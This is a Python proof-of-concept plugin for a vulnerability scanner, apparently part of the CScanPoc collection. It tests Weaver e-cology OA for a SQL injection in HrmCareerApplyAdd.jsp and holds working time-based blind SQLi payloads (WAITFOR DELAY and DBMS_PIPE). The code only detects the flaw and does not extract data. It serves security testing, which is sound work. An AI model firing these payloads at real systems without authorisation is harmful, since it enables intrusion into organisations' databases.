# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
import re


class Vuln(ABVuln):
    vuln_id = 'weaver_0031'  # 平台漏洞编号，留空
    name = '泛微e-cology通用性 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-21'  # 漏洞公布时间
    desc = '''
        作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
        泛微e-cology通用性SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0134994'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'dfe696a6-b9fc-4954-8fe1-9de8267f0207'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2015-0134994
            hh = hackhttp.hackhttp()
            payloads = [
                '/web/careerapply/HrmCareerApplyAdd.jsp?careerid=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27',
                '/web/careerapply/HrmCareerApplyAdd.jsp?careerid=1%20AND%20100%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2877%29%7C%7CCHR%28121%29%7C%7CCHR%2884%29%7C%7CCHR%2866%29%2C5%29'
            ]
            for payload1 in payloads:
                payload2 = payload1.replace('5', '0')
                t1 = time.time()
                code1, head, res, errcode, _ = hh.http(self.target + payload1)
                t2 = time.time()
                code2, head, res, errcode, _ = hh.http(self.target + payload2)
                t3 = time.time()
                if code1 == 200 and code2 == 200 and (2*t2 - t1 - t3 > 3):
                    #security_hole(arg + payload1 + "   :sql Injection")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
